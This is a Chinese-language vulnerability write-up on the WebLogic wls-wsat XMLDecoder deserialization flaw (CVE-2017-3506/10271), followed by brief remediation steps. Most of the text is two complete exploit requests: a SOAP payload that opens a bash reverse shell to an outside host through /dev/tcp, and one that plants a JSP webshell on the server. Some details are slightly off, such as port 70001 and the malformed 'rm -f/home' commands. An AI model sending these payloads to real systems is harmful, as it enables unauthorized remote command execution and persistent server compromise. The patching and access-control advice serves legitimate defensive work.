 CVE-2017-3506 & 10271
wls-wsat组件远程命令执行（wls-wsat是WebLogic Server大部分版本都默认包含的核心组件之一）
Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞。
条件：
```
Weblogic满足版本:
10.3.6.0
12.1.3.0
12.2.1.1
12.2.1.2

漏洞位置：wls-wsat.war
漏洞url：
:70001/wls-wsat/CoordinatorPortType 
:70001/wls-wsat/CoordinatorPortType11
Weblogic程序访问有这个目录的话，多半存在这个漏洞。

注入方式：POST
漏洞本质：构造SOAP(java的类XML格式)的请求，在解析过程中导致XMLDecoder反序列化漏洞。
```
## **漏洞利用：**
发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 633

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```
成功获取shell，写入webshell（访问：http://your-ip:7001/bea_wls_internal/test.jsp）：
```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: your-ip:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

## **修复：**
1. 删除组件war包 根据实际 环境 路径和业务需求，删除WebLogic程序下列war包及目录
```
rm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war 
rm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war 
rm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat 
```
2. 设置网络访问控制 配置 http://ip_address:7001/wls-wsat 网络访问控制策略，禁止外网可以直接访问。 
3. 更新补丁和扫描: 更新Oracle官方发布相关补丁，下载链接： http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html 。 
4. 检测和防御 阿里云态势感知已增加检测规则，支持入侵行为和漏洞检测，建议您开通态势感知（专业版以上版本）进行检测。